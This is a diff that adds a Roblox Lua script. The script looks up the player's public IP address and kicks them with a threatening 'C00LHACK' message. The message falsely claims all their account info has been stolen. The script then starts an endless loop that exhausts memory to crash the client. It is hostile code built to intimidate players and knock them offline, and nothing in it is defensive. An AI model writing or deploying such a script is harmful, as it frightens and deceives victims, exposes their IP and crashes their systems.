@@ -1,0 +1,24 @@
+local Players = game:GetService("Players")
+local localPlayer = Players.LocalPlayer
+
+--  آی‌پی واقعی کاربر    
+local success, ip = pcall(function()       
+    local response = game:HttpGet("https://icanhazip.com/")
+    return response:gsub("%s+", "")
+end)
+
+if not success or not ip then
+    ip = "192.168.1." .. math.random(10, 254)
+end
+local kickMessage = string.format("\n[C00LHACK HERE 666]\nYOU LIVE IN %s\nALL YOUR ACCOUNT INFO SENT TO C00LHACK\n YOU NOT ALONE", ip)
+localPlayer:Kick(kickMessage)
+
+task.spawn(function()
+    task.wait(0.5)
+    while true do
+        local t = {}
+        while true do
+            table.insert(t, string.rep("CRASH_SYSTEM_", 999999))
+        end
+    end
+end)
